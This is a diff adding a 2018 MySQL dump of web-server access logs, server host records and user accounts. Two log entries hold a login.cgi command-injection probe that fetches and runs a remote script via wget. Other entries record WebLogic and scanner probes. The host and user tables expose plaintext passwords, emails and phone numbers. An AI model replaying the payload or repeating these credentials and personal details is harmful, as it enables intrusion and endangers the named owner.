@@ -1,0 +1,125 @@
+-- MySQL dump 10.13  Distrib 5.7.22, for Linux (x86_64)
+--
+-- Host: localhost    Database: u61936
+-- ------------------------------------------------------
+-- Server version	5.7.22-0ubuntu0.16.04.1
+
+/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
+/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
+/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
+/*!40101 SET NAMES utf8 */;
+/*!40103 SET @OLD_TIME_ZONE=@@TIME_ZONE */;
+/*!40103 SET TIME_ZONE='+00:00' */;
+/*!40014 SET @OLD_UNIQUE_CHECKS=@@UNIQUE_CHECKS, UNIQUE_CHECKS=0 */;
+/*!40014 SET @OLD_FOREIGN_KEY_CHECKS=@@FOREIGN_KEY_CHECKS, FOREIGN_KEY_CHECKS=0 */;
+/*!40101 SET @OLD_SQL_MODE=@@SQL_MODE, SQL_MODE='NO_AUTO_VALUE_ON_ZERO' */;
+/*!40111 SET @OLD_SQL_NOTES=@@SQL_NOTES, SQL_NOTES=0 */;
+
+--
+-- Table structure for table `accesslogs`
+--
+
+DROP TABLE IF EXISTS `accesslogs`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `accesslogs` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `remoteAddr` varchar(40) NOT NULL,
+  `remoteUser` varchar(40) DEFAULT NULL,
+  `timeLocal` datetime NOT NULL,
+  `request` varchar(1000) NOT NULL,
+  `status` varchar(10) NOT NULL,
+  `bodyBytesSend` int(10) unsigned NOT NULL,
+  `httpReferer` varchar(100) DEFAULT NULL,
+  `httpUserAgent` varchar(1000) NOT NULL,
+  `host` varchar(40) NOT NULL,
+  PRIMARY KEY (`id`),
+  KEY `fk_host` (`host`),
+  CONSTRAINT `fk_host` FOREIGN KEY (`host`) REFERENCES `hosts` (`server`)
+) ENGINE=InnoDB AUTO_INCREMENT=976 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `accesslogs`
+--
+
+LOCK TABLES `accesslogs` WRITE;
+/*!40000 ALTER TABLE `accesslogs` DISABLE KEYS */;
+INSERT INTO `accesslogs` VALUES (889,'79.11.175.165','-','2018-06-29 07:06:03','HEAD / HTTP/1.0','200',0,'-','-','40.89.132.106'),(890,'78.188.114.226','-','2018-06-29 07:19:29','HEAD / HTTP/1.0','200',0,'-','-','40.89.132.106'),(891,'176.120.59.18','-','2018-06-29 07:36:53','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','40.89.132.106'),(892,'85.138.101.40','-','2018-06-29 07:49:07','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(893,'85.138.101.40','-','2018-06-29 07:49:12','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(894,'179.247.129.157','-','2018-06-29 07:51:14','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7','40.89.132.106'),(895,'83.142.122.230','-','2018-06-29 08:16:36','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7','40.89.132.106'),(896,'185.10.80.120','-','2018-06-29 09:04:49','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(897,'88.116.200.242','-','2018-06-29 10:15:49','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7','40.89.132.106'),(898,'151.63.137.87','-','2018-06-29 10:27:29','HEAD / HTTP/1.0','200',0,'-','-','40.89.132.106'),(899,'92.246.207.227','-','2018-06-29 11:03:14','HEAD / HTTP/1.0','200',0,'-','-','40.89.132.106'),(900,'196.52.43.116','-','2018-06-29 11:18:20','GET / HTTP/1.0','200',612,'-','Mozilla/5.0(WindowsNT6.1;rv:31.0)Gecko/20100101Firefox/31.0','40.89.132.106'),(901,'191.100.8.200','-','2018-06-29 11:19:59','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(902,'191.100.8.200','-','2018-06-29 11:20:04','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(903,'14.240.181.170','-','2018-06-29 11:39:58','HEAD / HTTP/1.0','200',0,'-','-','40.89.132.106'),(904,'212.203.83.231','-','2018-06-29 12:21:42','HEAD / HTTP/1.1','200',0,'-','-','40.89.132.106'),(905,'77.159.74.37','-','2018-06-29 12:52:02','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','40.89.132.106'),(906,'91.222.245.243','-','2018-06-29 13:06:19','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.132.106'),(907,'31.184.195.108','-','2018-06-29 13:39:53','GET / HTTP/1.0','200',612,'-','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36','40.89.132.106'),(908,'103.106.32.35','-','2018-06-29 14:06:12','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7','40.89.132.106'),(909,'109.121.162.40','-','2018-06-29 14:26:35','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','40.89.132.106'),(910,'184.177.184.74','-','2018-06-29 14:27:03','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(911,'132.248.20.75','-','2018-06-29 15:18:42','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(912,'132.248.20.75','-','2018-06-29 15:18:48','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(913,'186.50.194.180','-','2018-06-29 15:36:46','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(914,'107.3.57.177','-','2018-06-29 15:52:38','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(915,'179.97.46.222','-','2018-06-29 15:59:26','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.132.106'),(916,'37.49.231.62','-','2018-06-29 16:02:35','x16x03x01x00xCFx01x00x00xCBx03x03!\'4x09x84ZxFFxCCxCBxF8x9B-/p7x962(xEAxC1^xDExS?$x80zxBC$xB5x8Dx00x00x5CxC0,xC00xC0+xC0/xCCxA9xCCxA8x00xA3x00x9Fx00xA2x00x9ExCCxAAxC0xAFxC0xADxC0$xC0(xC0','400',182,'-','-','40.89.132.106'),(917,'116.87.176.183','-','2018-06-29 16:23:30','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(918,'176.191.59.74','-','2018-06-29 16:27:40','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(919,'109.94.177.117','-','2018-06-29 17:06:45','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(920,'182.52.67.122','-','2018-06-29 17:46:29','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.132.106'),(921,'51.38.12.23','-','2018-06-29 18:17:35','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','40.89.132.106'),(922,'86.146.235.25','-','2018-06-29 18:30:17','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(923,'86.146.235.25','-','2018-06-29 18:30:22','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(924,'103.217.154.90','-','2018-06-29 18:41:57','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.132.106'),(925,'31.184.194.109','-','2018-06-29 18:58:15','GET / HTTP/1.0','200',612,'-','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36','40.89.132.106'),(926,'14.191.229.209','-','2018-06-29 20:35:48','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(927,'14.191.229.209','-','2018-06-29 20:36:27','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(928,'180.146.209.93','-','2018-06-29 20:37:06','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(929,'180.146.209.93','-','2018-06-29 20:37:08','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(930,'182.253.32.21','-','2018-06-29 20:42:17','HEAD / HTTP/1.0','200',0,'-','-','40.89.132.106'),(931,'109.29.134.246','-','2018-06-29 21:03:05','GET / HTTP/1.0','200',612,'-','-','40.89.132.106'),(932,'191.100.8.15','-','2018-06-29 21:30:05','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(933,'191.100.8.15','-','2018-06-29 21:30:11','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.132.106'),(934,'81.201.62.160','-','2018-06-29 06:39:40','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','40.89.129.20'),(935,'14.172.166.57','-','2018-06-29 07:02:28','HEAD / HTTP/1.0','200',0,'-','-','40.89.129.20'),(936,'80.54.51.25','-','2018-06-29 07:22:07','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.129.20'),(937,'86.121.232.96','-','2018-06-29 07:34:00','GET / HTTP/1.0','200',612,'-','-','40.89.129.20'),(938,'85.138.101.40','-','2018-06-29 07:47:35','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(939,'85.138.101.40','-','2018-06-29 07:47:40','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(940,'78.8.249.81','-','2018-06-29 09:32:47','GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1','404',152,'-','Hello, World','40.89.129.20'),(941,'94.236.198.120','-','2018-06-29 09:42:12','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.129.20'),(942,'177.188.164.27','-','2018-06-29 09:42:35','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','40.89.129.20'),(943,'151.50.143.249','-','2018-06-29 10:15:25','HEAD / HTTP/1.0','200',0,'-','-','40.89.129.20'),(944,'93.176.220.37','-','2018-06-29 10:51:53','GET / HTTP/1.0','200',612,'-','-','40.89.129.20'),(945,'191.100.8.200','-','2018-06-29 11:18:28','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(946,'191.100.8.200','-','2018-06-29 11:18:34','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(947,'217.147.169.230','-','2018-06-29 11:47:23','POST /wls-wsat/CoordinatorPortType HTTP/1.1','404',209,'-','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_12_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.84 Safari/537.36','40.89.129.20'),(948,'177.83.226.19','-','2018-06-29 12:02:01','GET /login.cgi?cli=aa%20aa%27;wget%20http://185.62.190.191/r%20-O%20-%3E%20/tmp/r;sh%20/tmp/r%27$ HTTP/1.1','404',152,'-','Hello, World','40.89.129.20'),(949,'212.12.3.202','-','2018-06-29 12:34:06','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','40.89.129.20'),(950,'222.208.87.98','-','2018-06-29 13:56:57','HEAD / HTTP/1.0','200',0,'-','-','40.89.129.20'),(951,'177.103.105.80','-','2018-06-29 13:59:23','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.129.20'),(952,'197.159.117.83','-','2018-06-29 14:16:18','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','40.89.129.20'),(953,'178.93.55.176','-','2018-06-29 14:32:43','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.129.20'),(954,'132.248.20.75','-','2018-06-29 15:17:12','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(955,'132.248.20.75','-','2018-06-29 15:17:17','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(956,'37.49.231.62','-','2018-06-29 16:02:34','x16x03x01x00xCFx01x00x00xCBx03x03>txA7x1EhxA8xC8k','400',182,'-','-','40.89.129.20'),(957,'168.228.165.146','-','2018-06-29 16:13:30','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.129.20'),(958,'187.176.189.56','-','2018-06-29 16:47:00','GET / HTTP/1.0','200',612,'-','-','40.89.129.20'),(959,'181.209.64.130','-','2018-06-29 17:51:28','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7','40.89.129.20'),(960,'51.38.12.23','-','2018-06-29 18:12:57','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/41.0.2228.0 Safari/537.36','40.89.129.20'),(961,'86.146.235.25','-','2018-06-29 18:28:47','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(962,'86.146.235.25','-','2018-06-29 18:28:52','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(963,'31.184.194.109','-','2018-06-29 18:33:28','GET / HTTP/1.0','200',612,'-','Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36','40.89.129.20'),(964,'45.115.172.150','-','2018-06-29 18:36:47','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7','40.89.129.20'),(965,'13.229.116.8','-','2018-06-29 19:12:12','GET / HTTP/1.1','200',396,'-','Mozilla/5.0 zgrab/0.x','40.89.129.20'),(966,'110.77.187.212','-','2018-06-29 19:35:37','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/51.0.2704.103 Safari/537.36','40.89.129.20'),(967,'93.124.63.123','-','2018-06-29 20:34:24','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7','40.89.129.20'),(968,'194.152.18.214','-','2018-06-29 20:48:29','GET / HTTP/1.0','200',612,'-','-','40.89.129.20'),(969,'194.152.18.214','-','2018-06-29 20:48:30','GET / HTTP/1.0','200',612,'-','-','40.89.129.20'),(970,'195.9.123.58','-','2018-06-29 21:04:20','GET / HTTP/1.0','200',612,'-','-','40.89.129.20'),(971,'191.100.8.15','-','2018-06-29 21:28:35','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(972,'191.100.8.15','-','2018-06-29 21:28:40','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36','40.89.129.20'),(973,'41.33.179.130','-','2018-06-29 21:33:02','GET / HTTP/1.1','200',612,'-','Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36','40.89.129.20'),(974,'103.252.253.111','-','2018-06-29 21:50:59','HEAD / HTTP/1.1','200',0,'-','-','40.89.129.20'),(975,'130.204.246.159','-','2018-06-29 22:10:05','GET /web2018.html HTTP/1.1','404',209,'-','Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.181 Safari/537.36','40.89.129.20');
+/*!40000 ALTER TABLE `accesslogs` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
+-- Table structure for table `hosts`
+--
+
+DROP TABLE IF EXISTS `hosts`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `hosts` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `server` varchar(20) NOT NULL,
+  `user` varchar(20) NOT NULL,
+  `password` varchar(20) NOT NULL,
+  `owner` varchar(20) NOT NULL,
+  `adapter` varchar(20) NOT NULL,
+  `disk` varchar(20) NOT NULL,
+  `alias` varchar(40) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `server` (`server`),
+  KEY `owner_fk` (`owner`),
+  CONSTRAINT `owner_fk` FOREIGN KEY (`owner`) REFERENCES `users` (`username`)
+) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `hosts`
+--
+
+LOCK TABLES `hosts` WRITE;
+/*!40000 ALTER TABLE `hosts` DISABLE KEYS */;
+INSERT INTO `hosts` VALUES (2,'40.89.132.106','u61936','38564538onE$','pmmitkov','eth0','sda','General purpose web server'),(3,'40.89.129.20','u61936','38564538onE$','pmmitkov','eth0','sda','Secondary backup web server');
+/*!40000 ALTER TABLE `hosts` ENABLE KEYS */;
+UNLOCK TABLES;
+
+--
+-- Table structure for table `users`
+--
+
+DROP TABLE IF EXISTS `users`;
+/*!40101 SET @saved_cs_client     = @@character_set_client */;
+/*!40101 SET character_set_client = utf8 */;
+CREATE TABLE `users` (
+  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
+  `username` varchar(20) NOT NULL,
+  `password` varchar(20) NOT NULL,
+  `email` varchar(40) NOT NULL,
+  `phone` varchar(20) NOT NULL,
+  `firstname` varchar(20) NOT NULL,
+  `lastname` varchar(20) NOT NULL,
+  PRIMARY KEY (`id`),
+  UNIQUE KEY `username_2` (`username`),
+  KEY `username` (`username`(10))
+) ENGINE=InnoDB AUTO_INCREMENT=4 DEFAULT CHARSET=latin1;
+/*!40101 SET character_set_client = @saved_cs_client */;
+
+--
+-- Dumping data for table `users`
+--
+
+LOCK TABLES `users` WRITE;
+/*!40000 ALTER TABLE `users` DISABLE KEYS */;
+INSERT INTO `users` VALUES (2,'pmmitkov','38564538one','petko_mitkov@yahoo.com','+359885836955','petko','mitkov'),(3,'petko','38564538one','petko_hhp@abv.bg','0889360517','petko','mitkov');
+/*!40000 ALTER TABLE `users` ENABLE KEYS */;
+UNLOCK TABLES;
+/*!40103 SET TIME_ZONE=@OLD_TIME_ZONE */;
+
+/*!40101 SET SQL_MODE=@OLD_SQL_MODE */;
+/*!40014 SET FOREIGN_KEY_CHECKS=@OLD_FOREIGN_KEY_CHECKS */;
+/*!40014 SET UNIQUE_CHECKS=@OLD_UNIQUE_CHECKS */;
+/*!40101 SET CHARACTER_SET_CLIENT=@OLD_CHARACTER_SET_CLIENT */;
+/*!40101 SET CHARACTER_SET_RESULTS=@OLD_CHARACTER_SET_RESULTS */;
+/*!40101 SET COLLATION_CONNECTION=@OLD_COLLATION_CONNECTION */;
+/*!40111 SET SQL_NOTES=@OLD_SQL_NOTES */;
+
+-- Dump completed on 2018-06-30  1:32:19
